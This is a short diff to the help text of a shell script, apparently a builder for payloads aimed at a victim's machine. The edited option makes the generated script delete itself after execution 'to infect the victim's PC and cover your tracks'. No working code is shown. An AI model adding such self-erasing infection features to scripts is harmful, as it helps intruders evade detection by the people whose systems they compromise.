@@ -328,7 +328,7 @@ break
 ;;
 i|I)
 echo "
-If this option is enabled, the script will delete itself after execution. This is useful if you want to infect the victim's PC and cover your tracks. Additionally, it may be helpful if the script was first executed as a normal user and you later want it to run with root privileges (for additional functionality), without needing to re-download or regenerate it.
+If this option is enabled, the script will delete itself after execution. This is useful if you want to infect the victim's PC and cover your tracks. But, disabling this option can also be helpful if the script was first executed as a normal user and you later want it to run with root privileges (for additional functionality), without needing to re-download or regenerate it.
 "
 ;;
 esac
